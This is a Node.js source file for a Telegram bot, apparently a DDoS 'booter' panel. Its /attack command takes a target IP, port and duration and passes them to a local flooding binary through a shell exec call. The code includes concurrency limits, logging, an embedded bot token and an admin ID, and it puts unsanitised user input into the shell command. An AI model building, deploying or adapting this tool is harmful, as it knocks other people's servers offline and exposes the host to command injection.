// index.js const TelegramBot = require("node-telegram-bot-api"); const { exec } = require("child_process"); const fs = require("fs");

const TOKEN = "6838193855:AAGcpUWdeYWUjg75mSNZ5c7gS8E0nny63RM"; const ADMIN_ID = "6512242172"; const LOG_FILE = "log.txt"; const MAX_CONCURRENT_ATTACKS = 3;

let activeAttacks = [];

const bot = new TelegramBot(TOKEN, { polling: true });

function logAction(text) { const timestamp = new Date().toISOString(); fs.appendFileSync(LOG_FILE, [${timestamp}] ${text}\n); }

bot.onText(//start/, (msg) => { bot.sendMessage( msg.chat.id, 🚀 *Bot is online and ready!*\n👑 Owner: @offx_sahil\nUse /help to see available commands., { parse_mode: "Markdown" } ); });

bot.onText(//help/, (msg) => { bot.sendMessage( msg.chat.id, 🛠 *Bot Commands:*\n/start\n/help\n/attack <ip> <port> <duration>\n/status\n/clearstatus <slot>, { parse_mode: "Markdown" } ); });

bot.onText(//attack (.+)/, (msg, match) => { const chatId = msg.chat.id; const userId = msg.from.id.toString();

if (userId !== ADMIN_ID) { return bot.sendMessage(chatId, "⛔ Only admin can use this."); }

const args = match[1].split(" "); if (args.length !== 3) { return bot.sendMessage(chatId, "⚠️ Usage: /attack <ip> <port> <duration>"); }

const [ip, port, duration] = args;

if (isNaN(port) || isNaN(duration)) { return bot.sendMessage(chatId, "❌ Port and duration must be numbers."); }

if (parseInt(duration) > 180) { return bot.sendMessage(chatId, "⚠️ Max duration allowed: 180 seconds."); }

if (activeAttacks.length >= MAX_CONCURRENT_ATTACKS) { return bot.sendMessage(chatId, "⚠️ Max concurrent attacks running!"); }

const attackId = ${Date.now()}-${ip}; activeAttacks.push(attackId); logAction(Attack started by ${userId} on ${ip}:${port} for ${duration}s);

const attackCmd = ./iiipx ${ip} ${port} ${duration}; exec(attackCmd, (err, stdout, stderr) => { if (err) { logAction(Attack error: ${stderr}); bot.sendMessage(chatId, "❌ Attack failed to start."); } else { bot.sendMessage(chatId, ✅ Attack launched on \${ip}:${port}` for ${duration}s`, { parse_mode: "Markdown" });

setTimeout(() => {
    activeAttacks = activeAttacks.filter(id => id !== attackId);
    bot.sendMessage(chatId, `✅ Attack finished on \`${ip}:${port}\``, { parse_mode: "Markdown" });
    logAction(`Attack ended on ${ip}:${port}`);
  }, parseInt(duration) * 1000);
}

}); });

bot.onText(//status/, (msg) => { const status = 📊 Active attacks: ${activeAttacks.length} / ${MAX_CONCURRENT_ATTACKS}; bot.sendMessage(msg.chat.id, status, { parse_mode: "Markdown" }); });

bot.onText(//clearstatus (.+)/, (msg, match) => { const userId = msg.from.id.toString(); if (userId !== ADMIN_ID) { return bot.sendMessage(msg.chat.id, "⚠️ Only admin can use this."); }

const slot = parseInt(match[1]) - 1; if (slot >= 0 && slot < activeAttacks.length) { const removed = activeAttacks.splice(slot, 1); bot.sendMessage(msg.chat.id, ✅ Cleared attack slot ${slot + 1}); logAction(Admin cleared attack slot: ${removed}); } else { bot.sendMessage(msg.chat.id, "⚠️ Invalid slot number."); } });

